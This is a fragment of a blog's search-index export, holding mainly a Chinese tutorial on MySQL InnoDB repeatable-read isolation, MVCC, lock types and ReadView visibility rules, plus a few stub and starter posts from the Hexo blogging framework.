class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行3个事务(启动三个终端连接分别执行事务),类似与这样</p><p><img src="/posts/10021.png"></p><p>执行以下操作:</p><p><img src="/posts/10022.png"></p><p>注: 如果看不太清,可以在公众号回复:<code>(mysql可重复读)</code> 来获取<code>Excel</code> 文件.</p></blockquote><h3 id="4-可重复读的原理"><a href="#4-可重复读的原理" class="headerlink" title="4.可重复读的原理"></a>4.可重复读的原理</h3><blockquote><p>在<code>Mysql</code> 中有两个<code>view</code> 视图的概念</p><ul><li><code>view</code> :虚拟表,可以创建,可以查询.</li><li><code>InnoDB</code> 在实现数据库多版本并发控制(<code>MVCC</code> ) 用到的一致性读视图(<code>consistent read view</code>),用于支持<code>read commited</code>,<code>repeatable read</code> 隔离级别的.它没有物理结构,作用是在事务执行期间定义事务能看到的数据.</li></ul></blockquote><h4 id="1-MVCC"><a href="#1-MVCC" class="headerlink" title="1.MVCC"></a>1.<code>MVCC</code></h4><blockquote><p><code>MVCC(Multiversion Concurrency Control)</code>:<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6" target="_blank" rel="noopener">多版本并发控制</a>,用来解决读写锁造成的多个长时间的读操作饿死写操作的问题.每个事务读到的数据项都是一个历史快照(<code>snapshot</code>)并依赖实现的隔离级别,写操作不覆盖已经有的数据,而是创建一个新的版本,直到所有在操作提交的时候才变成可见.</p></blockquote><h4 id="2-锁的展示"><a href="#2-锁的展示" class="headerlink" title="2. 锁的展示:"></a>2. 锁的展示:</h4><blockquote><ul><li>读锁/共享锁/<code>S Lock</code> :若事务<code>T</code> 对数据对象A加上<code>S Lock</code> ,则事务<code>T</code> 可以读A但是不能修改A.其他事务只能再对A加<code>S Lock</code>,而不能加<code>X Lock</code> ,直到事务<code>T</code> 释放了A上的<code>S Lock</code> .这保证了其他事务可以读A,但是在事务<code>T</code> 不释放锁之前不能修改A</li><li>写锁/排他锁/<code>X Lock</code>:若事务<code>T</code> 对数据对象A加上<code>X Lock</code> ,则事务<code>T</code> 可以读A也可以修改A.其他事务不能再对A添加任何锁.直到事务<code>T</code> 释放了A上的锁.这保证了其他事务在锁没释放之前不能做任何操作.</li><li>表锁:操作对象的是数据表.事务<code>T</code> 对整个表加<code>S Lock</code> ,其他事务可读不可写.如果是<code>X Lock</code>,其他事务增删改都不行.系统的开销小,但可并发能力低.</li><li>行锁:操作对象是数据表中的一行.<code>MVCC</code> 使用比较多的技术.<code>MyISM</code> 不能使用.整个技术的实现是源自存储引擎,不是<code>mysql</code> 服务器.系统的开销大,可并发能力高.</li></ul><p>共享锁/排它锁 兼容性列表</p><table><thead><tr><th align="center"></th><th align="center"><code>X</code></th><th align="center"><code>S</code></th></tr></thead><tbody><tr><td align="center"><code>X</code></td><td align="center">不兼容</td><td align="center">不兼容</td></tr><tr><td align="center"><code>S</code></td><td align="center">不兼容</td><td align="center">兼容</td></tr></tbody></table></blockquote><h4 id="3-意向锁"><a href="#3-意向锁" class="headerlink" title="3.意向锁"></a>3.意向锁</h4><blockquote><p><code>InnoDB</code> 存储引擎支持多粒度锁定,这种锁定允许事务的行锁和表锁同时存在.为了支持在不同粒度上进行加锁操作,<code>InnoDb</code>存储引擎引入了一种称为意向锁的锁方式,意向锁是将锁定的对象分为了多个层次,意味者事务在更细粒度上的加锁.</p><p>意向锁是表级别的锁(和表锁不一样).设计的目的主要是为了在一个事务中揭示下一行被请求的锁类型.</p><ul><li><p><code>IS Lock</code> :意向共享锁,事务想要获取一张表中某几行的共享锁</p></li><li><p><code>IX Lock</code>:意向排它锁,事务想要获取一张表中某几行的排他锁</p></li><li><p>对一张表进行锁操作的时候,如果没有意向锁,需要遍历整个表,看是否有行锁的存在,而有意向锁后,只要比较兼容性,就可以得到结果.</p></li><li><p>意向锁不会和行锁发生冲突,它允许行锁和表锁的同时存在.但是会和表锁发生冲突,这也很好理解,意向读锁,肯定不能被表锁的写锁修改.他们的兼容性:</p><table><thead><tr><th align="center"></th><th align="center"><code>IS</code></th><th align="center"><code>IX</code></th><th align="center"><code>S</code></th><th align="center"><code>X</code></th></tr></thead><tbody><tr><td align="center"><code>IS</code></td><td align="center">兼容</td><td align="center">兼容</td><td align="center">兼容</td><td align="center">不兼容</td></tr><tr><td align="center"><code>IX</code></td><td align="center">兼容</td><td align="center">兼容</td><td align="center">不兼容</td><td align="center">不兼容</td></tr><tr><td align="center"><code>S</code></td><td align="center">兼容</td><td align="center">不兼容</td><td align="center">不兼容</td><td align="center">不兼容</td></tr><tr><td align="center"><code>X</code></td><td align="center">不兼容</td><td align="center">不兼容</td><td align="center">不兼容</td><td align="center">不兼容</td></tr></tbody></table></li></ul></blockquote><h4 id="4-Mysql-查看锁状态"><a href="#4-Mysql-查看锁状态" class="headerlink" title="4.Mysql 查看锁状态"></a>4.<code>Mysql</code> 查看锁状态</h4><blockquote><p>所有的状态保存在系统创建的数据库<code>INFORMATION_SCHEMA</code> 中:</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:test> show databases;                                    +--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                || test               |+--------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中</p><ul><li>表<code>INNODB_TRX</code>保存了当前运行的<code>InnoDB</code> 事务.</li><li>表<code>INNODB_LOCKS</code>:查看锁的状态</li><li>表<code>INNODB_LOCK_WAITS</code>:可以直观的反应当前事务的等待.</li></ul><p>表<code>INNODB_TRX</code> 字段:</p><table><thead><tr><th><code>trx_id</code></th><th><code>InnoDB</code>存储引擎内部唯一的事务ID</th></tr></thead><tbody><tr><td><code>trx_state</code></td><td>当前事务的状态</td></tr><tr><td><code>trx_started</code></td><td>事务的开始时间</td></tr><tr><td><code>trx_request_lbck_id</code></td><td>等待事务的锁ID.如果<code>trx_state</code> 为<code>lock wait</code> 那么该字段代表当前事务等待之前事务占用的锁资源ID</td></tr><tr><td><code>trx_wait_strated</code></td><td>事务的等待时间</td></tr><tr><td><code>trx_weight</code></td><td>事务的权重,反应一个事务修改和锁住的行数,当发生死锁需要回滚时,会选择该数值最小的进行回滚</td></tr><tr><td><code>trx_mysql_tread_id</code></td><td>线程ID,<code>show processlist</code>当前的连接的客户端和状态</td></tr><tr><td><code>trx_query</code></td><td>事务运行的<code>SQL</code>语句</td></tr></tbody></table><p>表<code>INNODB_LOCKS</code> 字段</p><table><thead><tr><th><code>lock_id</code></th><th>锁ID</th></tr></thead><tbody><tr><td><code>lock_trx_id</code></td><td>事务ID</td></tr><tr><td><code>lock_mode</code></td><td>锁模式</td></tr><tr><td><code>lock_type</code></td><td>锁的类型,表还是行</td></tr><tr><td><code>lock_table</code></td><td>要加锁的表</td></tr><tr><td><code>lock_index</code></td><td>锁住的索引</td></tr><tr><td><code>lock_space</code></td><td>锁住的<code>space ID</code></td></tr><tr><td><code>lock_page</code></td><td>事务锁定页的数量,若是表锁,则该值为<code>NULL</code></td></tr><tr><td><code>lock_rec</code></td><td>事务锁住行的数量,若是表锁,则该值为<code>NULL</code></td></tr><tr><td><code>lock_data</code></td><td></td></tr></tbody></table><p>表<code>INNODB_LOCK_WAITS</code>字段</p><table><thead><tr><th><code>requesting_trx_id</code></th><th>申请锁资源的事务ID</th></tr></thead><tbody><tr><td><code>requesting_lock_id</code></td><td>申请锁的ID</td></tr><tr><td><code>blocking_trx_id</code></td><td>阻塞的事务ID</td></tr><tr><td><code>blocking_lock_id</code></td><td>阻塞的锁的ID</td></tr></tbody></table></blockquote><h4 id="5-当前读-快照读"><a href="#5-当前读-快照读" class="headerlink" title="5.当前读,快照读"></a>5.当前读,快照读</h4><blockquote><p>当前读<br>像select lock in share mode(共享锁), select for update ; update, insert ,delete(排他锁)这些操作都是一种当前读，为什么叫当前读?就是它读取的是记录的最新版本,读取时还要保证其他并发事务不能修改当前记录,会对读取的记录进行加锁.</p><p>快照读<br>像不加锁的select操作就是快照读，即不加锁的非阻塞读；快照读的前提是隔离级别不是串行级别，串行级别下的快照读会退化成当前读；之所以出现快照读的情况，是基于提高并发性能的考虑，快照读的实现是基于多版本并发控制，即MVCC,可以认为MVCC是行锁的一个变种，但它在很多情况下，避免了加锁操作，降低了开销；既然是基于多版本，即快照读可能读到的并不一定是数据的最新版本，而有可能是之前的历史版本</p><p><code>MVCC</code> 中读操作实现的是乐观锁,可以就是读取的是快照.</p><p>为了解决’读写’ 冲突,它的实现原理最主要依赖的就是</p><ul><li>隐式字段</li><li><code>undo log</code> 日志文件</li><li><code>ReadView</code></li></ul></blockquote><h4 id="6-隐式字段"><a href="#6-隐式字段" class="headerlink" title="6.隐式字段"></a>6.隐式字段</h4><blockquote><p><code>Innodb</code> 存储引擎为数据库表中每行记录都实现了隐藏字段,也就是除了自己定义的字段之外的不可见字段.</p><ul><li><code>DB_TRX_ID</code>: 最近修改的事务ID,记录创建这条记录或者是最后一次修改该记录的事务ID</li><li><code>DB_ROLL_PTR</code>:回滚指针,指向这条记录的上一个版本(指向当前记录项的<code>rollback segment</code>的<code>undo log</code>记录)</li><li><code>DB_ROW_ID</code>:隐藏的主键ID,如果表没有定义主键,<code>InnoDB</code> 会自动在<code>DB_ROW_ID</code>产生一个聚簇索引</li><li><code>DELETE BIT</code>:用于标识该记录是否被删除,这里的不是真正的删除数据,真正删除要在<code>commit</code> 执行后.</li></ul></blockquote><h4 id="7-undo-log"><a href="#7-undo-log" class="headerlink" title="7.undo log"></a>7.<code>undo log</code></h4><blockquote><p><code>undo log</code> 分为两种:</p><ul><li><code>insert undo log</code>:代表事务在<code>insert</code> 新纪录时产生的<code>undo log</code> ,只在事务回滚时需要,并且在事务提交后可以被立即丢弃</li><li><code>update undo log</code>:事务在进行<code>update</code>或<code>delete</code>时产生的<code>undo log</code> ,不仅在事务回滚时需要,在快照读时也需要.所以不能随便删除,只有在快速读或事务回滚不涉及该日志时,对应的日志才会被<code>purge</code>线程统一清除</li></ul><p><code>purge</code></p><ul><li>为了节省磁盘空间,InnoDB有专门的purge线程来清理deleted_bit为true的记录,为了不影响MVCC的正常工作,purge线程自己也维护了一个read view(这个read view相当于系统中最老活跃事务的read view),如果某个记录的deleted_bit为true,并且DB_TRX_ID相对于purge线程的read view可见,那么这条记录一定是可以被安全清除的.</li></ul></blockquote><h4 id="8-事务链表"><a href="#8-事务链表" class="headerlink" title="8.事务链表"></a>8.事务链表</h4><blockquote><p><code>mysql</code> 中的事务从开始到提交的过程中,都会被保存在一个叫<code>trx_sys</code> 的链表结构中.(trx4是事务ID)</p><p><img src="/posts/10023.png"></p><p>事务链表中保存的都是还没有提交的事务,事务一旦被提交,就会从事务链表中删除.</p></blockquote><h4 id="9-ReadVIew"><a href="#9-ReadVIew" class="headerlink" title="9.ReadVIew"></a>9.<code>ReadVIew</code></h4><blockquote><p><code>ReadView</code> 是事务进行<code>乐观锁</code> 的时操作时产生的读视图(<code>view</code>),在执行事务的时候被创建.它包含3个主要的成员:<code>ReadView{ low_trx_id, up_trx_id, trx_ids}</code> ,在并发的情况下,一个事务在启动时,在<code>trx_sys</code> 中保存了所有的未提交事务,那么哪些改变是对当前事务是可见的,哪些是不可见的.这个是通过这个视图<code>ReadVIew</code> 来判断的.</p><ul><li><code>low_trx_id</code>:表示该事务启动时,当前事务链表中最大的事务ID,也就是最近创建的除自身之外的最大的事务ID</li><li><code>up_trx_id</code>:表示该事务启动时,当前事务链表中最小的事务ID,也就是当前系统中创建最早的还未提交的事务ID.</li><li><code>trx_ids</code>:表示所有事务链表中事务的ID集合</li></ul><p><img src="/posts/10024.png"></p><p><code>transaction id</code>: <code>InnoDB</code> 存储引擎为每一个事务生成的一个唯一ID,也就是表<code>INNODB_TRX</code> 的<code>trx_id</code> 字段的值.这个ID的值会严格按照申请顺序递增.</p><p>每次事务更新数据的时候,都会生成一个新的数据版本,并且把<code>transaction id</code> 赋值给这个数据版本的事务ID,记为<code>row trx_id</code> .同时旧的数据版本要保留,并且在数据版本中,能够有信息可以直接拿到它.这就说明了,数据表中的一行记录,可以存在多个版本了的<code>row</code> ,每个版本都有自己的<code>trx_id</code>.这个记录被写在了表中每行的隐藏字段<code>db_trx_id</code></p><p>假设是最开始的表结构:</p><pre class="line-numbers language-mysql"><code class="language-mysql">+----+---+| id   |   k  |+----+---+| 1    |   1 || 2    |   2 |+----+---+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么事务A(ID=10)事务B(ID=15)事务C(ID=17),事务D(ID=25)中针对<code>id=1</code> 的行的操作为</p><p><img src="/posts/10027.png"></p><p>V1,V2,V3视图中的值并不是真是存在的,而是通过U1,U2,U3,这个几个<code>undo log</code> 计算出来的.</p><p>那么结合上面的事务的视图(<code>ReadVIew</code>)的结构形成了如下的结构</p><p><img src="/posts/10028.png"></p><p>这就是数据库的看见性规则,当某个事务启动的瞬间,它读到的表的隐藏字段的<code>DB_TRX_ID</code> 的值,有一下几种可能:</p><ul><li><code>DB_TRX_ID</code> 值处于已提交事务,数据是可见的.</li><li><code>DB_TRX_ID</code> 值处于将开始事务,表示这个版本的数据是由将来启动的事务创建的.是不可见的.</li><li><code>DB_TRX_ID</code> 的值处于<code>trx_ids</code> 的数组中,表示这个版本是由还没有提交的事务生成的.不可见.</li><li><code>DB_TRX_ID</code> 的值不在<code>trx_ids</code> 的数组中,表示这个版本是由已经提交的事务生成的.是可见的.</li></ul><hr><p>假设:当前系统中存在几个事务</p><ol><li>事务A开始之前,系统中只有一个活跃的事务ID为99</li><li>事务A,B,C的事务ID分别为100,101,102.而且当前系统中只有4个事务.</li><li>3个事务开始前表 <code>transaction_test</code> 的<code>ID=1</code> 的隐藏字段<code>DB_TRX_ID</code> 是90</li></ol><table><thead><tr><th>时间</th><th>活跃事务(99)</th><th>事务A(100)</th><th>事务B(101)</th><th>事务C(102)</th></tr></thead><tbody><tr><td>T1</td><td>trx_id=90</td><td></td><td></td><td></td></tr><tr><td>T2</td><td></td><td>ReadVIew{99,100,}</td><td></td><td></td></tr><tr><td>T3</td><td></td><td></td><td>ReadVIew{99,100,101}</td><td></td></tr><tr><td>T4</td><td></td><td></td><td></td><td>ReadVIew{99,100,101,102}</td></tr><tr><td>T5</td><td></td><td></td><td></td><td>update from transaction_test<br>set k=k+1<br>where id=1<br><strong>trx_id=102</strong></td></tr><tr><td>T6</td><td></td><td></td><td>update from transaction_test<br>set k=k+1<br>where id=1<br>trx_id=101</td><td></td></tr><tr><td>T7</td><td></td><td>select * from<br>transcation_test<br>where id=1</td><td></td><td></td></tr></tbody></table><p>随着时间的推进.第一个有效更新是事务C,把数据从<code>(1,1)</code> 变成了(<code>1,2</code>),这时候,这个数据的<code>db_trx_id</code> 是102,原来的90变成了历史版本.</p><p>第二个有效更新的是事务B,把数据从<code>(1,2)</code> 变成了<code>(1,3)</code> ,这时候数据的<code>db_trx_id</code>是101,原来的102变成了历史版本</p><p>当事务A查询的时候,事务B还没有提交,但是它生成的<code>(1,3)</code> 这个已经是当前版本了.这个数据对象必须是不可读的.否则就是脏读了.</p><p>事务A的查询为(事务A的<code>ReadVIew={99,100}</code>):</p><ul><li><p>找到了(<code>1,3</code>)的<code>db_trx_id</code> 是101,属于将开始事务,数据不可见.</p></li><li><p>根据(<code>1,3</code>) 的<code>DB_ROLL_PTR</code> 和<code>undo log</code> 的对应,回滚找到上一个历史版本<code>(1,2)</code> ,它的<code>db_trx_id</code> 为102,属于将开始事务,数据不可见.</p></li><li><p>根据(<code>1,2</code>) 的<code>DB_ROLL_PTR</code> 和<code>undo log</code> 的对应,回滚找到上一个历史版本<code>(1,1)</code> ,它的<code>db_trx_id</code> 为90,属于已经提交的事务,数据可见.</p></li></ul><p>这样保证了数据的一致性读.<br>总结一下,对于一个事务视图来说,除了直接的更新总是可见外,</p><ul><li>对于数据版本没有提交的,不可见</li><li>对于数据已经提交,但是是在视图创建后提交的.不可见</li><li>对于数据已经提交,但是是在视图创建前提交的.可见</li></ul><p>回顾以上<code>Excel</code> 中的查询</p><p>事务2在<code>T7</code> 时间查看到<code>k</code> 的值是3,而根据一致性读的规则,结果应该是不对的.</p><ul><li>事务2的视图数组是先创建的,之后事务3才提交,应该看见(1,2)怎么能算出(1,3)来.</li></ul><p>确实如此,如果事务2在更新之前查询一次数据,这个查询返回的k的值确实是1.</p><p>但是,当它要去更新数据的时候,就不能再在历史版本上更新了,否则事务3的更新就丢失了.</p><p>因此,事务2此时的<code>set k=k+1</code>是在(1,2)的基础上进行的操作,这里就用到了这样一条规则:更新数据都是先读后写的,而这个读,只能读当前的值,称为当前读<code>current read</code>.</p><p>当前读:像<code>select lock in share mode</code>(共享锁), <code>select for update</code> ; update, insert ,delete(排他锁)这些操作都是一种当前读，为什么叫当前读?就是它读取的是记录的最新版本,读取时还要保证其他并发事务不能修改当前记录,会对读取的记录进行加锁.</p><p>所以,事务2在执行<code>update</code>前,读到的记录的最新版本是<code>(1,2)</code> ,<code>trx_id</code> 是102,<code>update</code> 后,<code>trx_id</code>变成了101,数据变成了<code>(1,3)</code>.再执行<code>select</code> 语句的时候,<code>row_id</code> 指向了自己,按照一致性读的规则.自己对自己是可见的.所以就可以读出<code>(1,3)</code>.</p></blockquote><p><img src="/posts/wechat.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/posts/101.html"/>
      <url>/posts/101.html</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/posts/63534.html"/>
      <url>/posts/63534.html</url>
      
        <content type="html"><![CDATA[<p><code>python</code></p><pre class="line-numbers language-python">print(&#39;hello world&#39;)</code></pre><p><code>mysql</code></p><pre><code class="sql">select * from Users;</code></pre><pre><code class="javascript"><code class="language-python">print(&#39;hello world&#39;)</code></pre><p><code>mysql</code></p><pre><code class="sql">select * from Users;</code></pre><pre><code class="javascript">function(){    console.log(1);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/16107.html"/>
      <url>/posts/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash"><code class="language-bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
